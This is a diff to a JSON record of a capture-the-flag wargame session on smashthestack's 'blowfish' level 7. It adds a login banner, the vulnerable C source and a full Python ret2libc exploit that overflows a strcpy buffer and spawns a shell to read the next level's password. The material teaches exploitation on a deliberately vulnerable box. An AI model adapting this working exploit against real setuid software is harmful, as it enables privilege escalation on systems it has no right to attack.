@@ -1302,12 +1302,61 @@
   {
    "lvl": 7,
    "user": "level7",
-   "pw": "g00d_j0b",
+   "pw": "w3ll_d0n3!",
    "steps": [
     {
      "cmd": "ssh -p 2222 level7@blowfish.smashthestack.org",
      "out": [
-      "level7@blowfish:~$ "
+      "level7@blowfish.smashthestack.org's password: ",
+      "",
+      "   _        __                          ___              __ ",
+      "",
+      " /\\ \\     /\\_ \\                       /'___\\ __         /\\ \\        ",
+      "",
+      " \\ \\ \\____\\//\\ \\     ___   __  __  __/\\ \\__//\\_\\    ____\\ \\ \\___    ",
+      "",
+      "  \\ \\ '__`\\ \\ \\ \\   / __`\\/\\ \\/\\ \\/\\ \\ \\  __\\/\\ \\  /' __\\\\ \\  _ `\\  ",
+      "",
+      "   \\ \\ \\_\\ \\ \\_\\ \\_/\\ \\_\\_\\ \\ \\_/ \\_/ \\ \\ \\_/\\ \\ \\/\\__  `\\\\ \\ \\ \\ \\ ",
+      "",
+      "    \\ \\____/ /\\____\\ \\____/\\ \\___x___/'\\ \\_\\  \\ \\_\\/\\____/ \\ \\_\\ \\_\\",
+      "",
+      "     \\/___/  \\/____/\\/___/  \\/__//__/   \\/_/   \\/_/\\/___/   \\/_/\\/_/",
+      "",
+      "     wargame ++ smashthestack.org ++ now in version 2.0",
+      "",
+      "   ",
+      "",
+      "     1. Thou shalt NOT root or otherwise harm the box.",
+      "",
+      "     2. Thou shalt NOT do any network access from this box.",
+      "",
+      "     3. Thou shalt NOT use /tmp, /levels/tmp or /var/tmp for personal code. ",
+      "",
+      "     4. Thou shalt give the root pass to l3thal if you manage to change it.",
+      "",
+      "     ",
+      "",
+      "     Passwords are in /pass.",
+      "",
+      "     There is a README in each users home directory.",
+      "",
+      "     /tmp && /var/tmp will be flushed daily by cron.",
+      "",
+      "     Use /code plz for umm, code ;D",
+      "",
+      "     IF YOU LEAVE FILES IN /levels/tmp U SUCK ..plz remove them kthnx! ;D",
+      "",
+      "     The password for the last level will get you into",
+      "",
+      "     Tux, the more advanced wargame. Join #blowfish on ",
+      "",
+      "     irc.smashthestack.org with any questions. ",
+      "",
+      "",
+      "",
+      "     Admin - s0ttle@smashthestack.org",
+      ""
      ]
     },
     {
@@ -1326,37 +1375,134 @@
     {
      "cmd": "cat /levels/level7.c",
      "out": [
-      "for(i = 1; i < argc; i++) memset(argv[i], 0, strlen(argv[i]));",
-      "strstr(argv[0], key2..key5): rejects 0x90/0xeb/0xcd/0xff",
-      "strcpy(buffer, argv[0]);"
+      "#include <stdio.h>",
+      "#include <string.h>",
+      "int main(int argc, char *argv[]) {",
+      "  int i;",
+      "  char  buffer[32];",
+      "//char  *key1 = \"/\";",
+      "  char  *p1, *p2, *p3, *p4, *p5;",
+      "  char  key2[2], key3[2], key4[2], key5[2];",
+      "//  if(argc != 2)",
+      "//    return -1;",
+      "  for(i = 1; i < argc; i++) {",
+      "        memset(argv[i], 0, strlen(argv[i]));",
+      "  }",
+      "  sprintf(key2, \"%c\", 0x90); // nop",
+      "  sprintf(key3, \"%c\", 0xeb); // jmp",
+      "  sprintf(key4, \"%c\", 0xcd); // int",
+      "  sprintf(key5, \"%c\", 0xff); // still easy",
+      "//p1 = strstr(argv[0], key1);",
+      "  p2 = strstr(argv[0], key2);",
+      "  p3 = strstr(argv[0], key3);",
+      "  p4 = strstr(argv[0], key4);",
+      "  p5 = strstr(argv[0], key5);",
+      "  if (p2 != NULL || p3 != NULL || p4 != NULL || p5 != NULL) {",
+      "    printf(\"Access denied.\\n\");",
+      "    return -1;",
+      "  }",
+      "  else {",
+      "    printf(\"Access granted.\\n\");",
+      "  }",
+      "  strcpy(buffer, argv[0]);",
+      "  return 0;",
+      "}"
      ]
     },
     {
-     "cmd": "objdump -d --no-show-raw-insn /levels/level7 | grep -B4 'call   80483b4 <strcpy@plt>'",
+     "cmd": "objdump -d --no-show-raw-insn /levels/level7 | grep -B4 'call   80483b4 <strcpy@plt>' | head -8",
      "out": [
-      "lea -0x38(%ebp),%eax ... call strcpy@plt",
-      "(buffer at ebp-0x38 -> ret at offset 60)"
+      " 80485fe:\tmov    (%eax),%eax",
+      " 8048600:\tmov    %eax,0x4(%esp)",
+      " 8048604:\tlea    -0x38(%ebp),%eax",
+      " 8048607:\tmov    %eax,(%esp)",
+      " 804860a:\tcall   80483b4 <strcpy@plt>"
      ]
     },
     {
-     "cmd": "cat /proc/sys/kernel/randomize_va_space; cat /proc/self/maps | grep libc-2.7.so | head -2",
+     "cmd": "cat /proc/sys/kernel/randomize_va_space",
      "out": [
-      "0",
-      "b7e9d000-b7fd5000 r-xp ... /lib/libc-2.7.so"
+      "0"
+     ]
+    },
+    {
+     "cmd": "cat /proc/self/maps | grep libc-2.7.so | head -2",
+     "out": [
+      "b7e9d000-b7fd5000 r-xp 00000000 fc:01 2626528    /lib/libc-2.7.so",
+      "b7fd5000-b7fd6000 r--p 00138000 fc:01 2626528    /lib/libc-2.7.so"
      ]
     },
     {
      "cmd": "nm -D /lib/libc-2.7.so | grep -E 'W (system|setuid)$|T (strcpy|execl)$'",
      "out": [
-      "00037eb0 W system",
-      "000711f0 T strcpy"
+      "000957e0 T execl",
+      "00095fb0 W setuid",
+      "000711f0 T strcpy",
+      "00037eb0 W system"
      ]
     },
     {
-     "cmd": "vi /dev/shm/e_bf7.py",
+     "cmd": "vim /dev/shm/e_bf7.py",
+     "out": []
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf7.py",
      "out": [
-      "(ret2libc: A*60 + strcpy@libc + system@libc + dst 0xb7fd7001 + \"/bin/sh\" ptr; pipe-fed id + cat /pass/level8)",
-      "[New] 45L, 1692C written"
+      "1 import struct, os, time, sys, select",
+      "2 # level7: strcpy(buffer[32], argv[0]) - buffer at ebp-0x38, ret at offset 60.",
+      "3 # argv[1..] are memset to 0 BEFORE the copy, so the payload rides in argv[0] itself.",
+      "4 # argv[0] is filtered: strstr rejects 0x90/0xeb/0xcd/0xff, which bans NOPs, the",
+      "5 # 0x0804... PLT trampolines' addresses and every 0xbfff.... stack address - but libc",
+      "6 # addresses (0xb7e9...., ASLR is off so the base is fixed at 0xb7e9d000) are all",
+      "7 # NUL-free and byte-legal. So: ret2libc.",
+      "8 # system() alone would exec /bin/sh with euid=level8; the ROP first strcpy's \"/bin/sh\"",
+      "9 # into libc's writable page (to show the mechanism, and because a plain \"sh\" string",
+      "10 # works equally): chain = [strcpy@libc][system@libc][dst][ptr \"/bin/sh\"][dst].",
+      "11 # strcpy(dst, \"/bin/sh\") then system(dst) - the returned-to system reads its argument",
+      "12 # from the slot two dwords after strcpy's, which holds dst again.",
+      "13 STRCPY = 0xb7e9d000 + 0x711f0",
+      "14 SYSTEM = 0xb7e9d000 + 0x37eb0",
+      "15 BINSH  = 0xb7fba13f          # \"/bin/sh\" inside libc's rodata",
+      "16 DST    = 0xb7fd7001          # writable libc page, byte-safe address",
+      "17 payload = \"A\" * 60 + struct.pack(\"<IIIII\", STRCPY, SYSTEM, DST, BINSH, DST)",
+      "18 r, w = os.pipe()",
+      "19 r2, w2 = os.pipe()",
+      "20 pid = os.fork()",
+      "21 if pid == 0:",
+      "22     os.close(r)",
+      "23     os.close(w2)",
+      "24     os.dup2(r2, 0)",
+      "25     os.dup2(w, 1)",
+      "26     os.execve(\"/levels/level7\", [payload, \"x\"], {})"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf7.py",
+     "out": [
+      "27 os.close(w)",
+      "28 os.close(r2)",
+      "29 time.sleep(2)",
+      "30 os.write(w2, \"id\\ncat /pass/level8\\n\\n\")",
+      "31 out = \"\"",
+      "32 deadline = time.time() + 5",
+      "33 while time.time() < deadline:",
+      "34     rr, _, _ = select.select([r], [], [], 0.2)",
+      "35     if not rr:",
+      "36         continue",
+      "37     try:",
+      "38         d = os.read(r, 4096)",
+      "39     except OSError:",
+      "40         break",
+      "41     if not d:",
+      "42         break",
+      "43     out += d",
+      "44 print out"
+     ]
+    },
+    {
+     "cmd": "vim /dev/shm/e_bf7.py",
+     "out": [
+      "\"/dev/shm/e_bf7.py\" [New] 45L, 1692C written"
      ]
     },
     {
@@ -1364,6 +1510,15 @@
      "out": [
       "uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1007(level7)",
       "w3ll_d0n3!"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to blowfish.smashthestack.org closed.",
+      "client$ exit",
+      "exit"
      ]
     }
    ],
